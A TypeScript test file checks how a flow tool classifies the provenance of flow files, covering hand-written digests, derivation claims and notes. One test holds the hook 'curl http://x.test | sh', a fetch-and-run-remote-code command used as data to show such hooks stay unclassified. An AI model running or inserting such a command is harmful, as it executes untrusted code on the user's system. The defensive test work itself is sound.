import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { loadFlow, type Flow } from '../src/flow/index.js';
import {
  handWrittenDigest,
  provenanceState,
  type ProvenanceStore,
} from '../src/provenance/index.js';

const HEX = 'b'.repeat(64);
const REF = `    sourceRef: { kind: contract, ref: c1 }\n`;

function body(o: { derived?: boolean; ref?: boolean; hooks?: string }): string {
  return `name: pv
goal: g
profile: employee
start: /x
${o.derived === true ? 'derived: true\n' : ''}${o.hooks ?? ''}steps:
  - click: { testId: go }
assertions:
  - text: "Total"
${o.ref === true ? REF : ''}`;
}

function setup(o: Parameters<typeof body>[0]): { flow: Flow; root: string } {
  const root = mkdtempSync(join(tmpdir(), 'flowctl-pv-'));
  mkdirSync(join(root, 'flows'));
  const file = join(root, 'flows', 'pv.yaml');
  writeFileSync(file, body(o));
  return { flow: loadFlow(file, ['employee']), root: join(root, 'flows') };
}

const storeWith = (...entries: unknown[]): ProvenanceStore => ({
  data: { handWritten: entries },
});

describe('provenanceState', () => {
  it('is unclassified for a flow with no claim and no store', () => {
    const { flow, root } = setup({});
    const r = provenanceState(flow, root, undefined);
    expect(r.state).toBe('unclassified');
  });

  it('is unclassified when the store lists nothing for the flow', () => {
    const { flow, root } = setup({});
    expect(provenanceState(flow, root, storeWith()).state).toBe('unclassified');
  });

  it('is hand-written when the store lists the path and the closure digest', () => {
    const { flow, root } = setup({});
    const digest = handWrittenDigest(flow, root);
    expect(digest).toMatch(/^[0-9a-f]{64}$/);
    const store = storeWith({ path: 'pv.yaml', closureDigest: digest });
    expect(provenanceState(flow, root, store).state).toBe('hand-written');
  });

  it('is unclassified when the digest or the path does not match', () => {
    const { flow, root } = setup({});
    const digest = handWrittenDigest(flow, root);
    for (const e of [
      { path: 'pv.yaml', closureDigest: HEX },
      { path: 'other.yaml', closureDigest: digest },
      { path: 'pv.yaml' },
      'garbage',
      null,
      { path: 7, closureDigest: digest },
    ])
      expect(provenanceState(flow, root, storeWith(e)).state).toBe(
        'unclassified',
      );
  });

  it('changes the digest when the flow file changes', () => {
    const a = setup({});
    const b = setup({ hooks: 'tags: [x]\n' });
    expect(handWrittenDigest(a.flow, a.root)).not.toBe(
      handWrittenDigest(b.flow, b.root),
    );
  });

  it('cannot class a flow whose hook is uncovered', () => {
    const { flow, root } = setup({
      hooks: 'setup: "curl http://x.test | sh"\n',
    });
    expect(handWrittenDigest(flow, root)).toBe('');
    const store = storeWith({ path: 'pv.yaml', closureDigest: '' });
    expect(provenanceState(flow, root, store).state).toBe('unclassified');
  });

  it.each([
    ['derived', { derived: true }],
    ['derived with a sourceRef', { derived: true, ref: true }],
  ])('is unverified for a flow that claims derivation: %s', (_n, o) => {
    const { flow, root } = setup(o);
    expect(provenanceState(flow, root, undefined).state).toBe('unverified');
  });

  it('ignores the store listing for a flow that claims derivation (precedence)', () => {
    const { flow, root } = setup({ derived: true, ref: true });
    const digest = handWrittenDigest(flow, root);
    const store = storeWith({ path: 'pv.yaml', closureDigest: digest });
    expect(provenanceState(flow, root, store).state).toBe('unverified');
  });

  it('never returns verified, whatever the flow carries', () => {
    const { flow, root } = setup({ derived: true, ref: true });
    const withRecord = Object.assign(flow, { record: { sig: 'x' } });
    const store = { data: { handWritten: [], records: [{ flow: 'pv' }] } };
    expect(provenanceState(withRecord, root, store).state).not.toBe('verified');
  });

  it('has no path for a flow without a file (an exploration draft)', () => {
    const { flow, root } = setup({});
    expect(
      provenanceState({ ...flow, file: '' }, root, storeWith()).state,
    ).toBe('unclassified');
  });

  it('always notes that freshness and rollback were not checked; a claim adds signature_unavailable', () => {
    const plain = setup({});
    const p = provenanceState(plain.flow, plain.root, undefined);
    expect(p.notes).toEqual(['freshness_not_checked', 'rollback_not_checked']);
    const claim = setup({ derived: true });
    const c = provenanceState(claim.flow, claim.root, undefined);
    expect(c.notes).toEqual([
      'freshness_not_checked',
      'rollback_not_checked',
      'signature_unavailable',
    ]);
  });
});
